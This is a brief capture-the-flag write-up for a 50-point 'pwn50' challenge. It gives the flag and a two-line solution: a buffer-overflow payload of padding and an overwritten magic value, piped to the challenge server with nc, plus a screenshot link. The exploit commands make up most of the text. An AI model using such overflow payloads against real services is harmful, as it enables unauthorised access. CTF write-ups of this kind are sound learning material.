@tnmch
-------------------------------------------------

pwn50 : 50pts

flag :Bugs_Bunny{lool_cool_stuf_even_its_old!!!!!} flag updated

------------------------------------------------

nc server_ip 5251 

solution :
echo -ne "bugAAAAAAAAAAAAAAAAAAAAA\xed\xac\xef\x0d" > /tmp/pwn50

(cat /tmp/pwn50;cat - )| nc server_ip 5251

![capture d ecran 2017-07-23 a 11 58 21 pm](https://user-images.githubusercontent.com/7364615/28503221-d80dd2d2-7002-11e7-823d-54181e721ade.png)
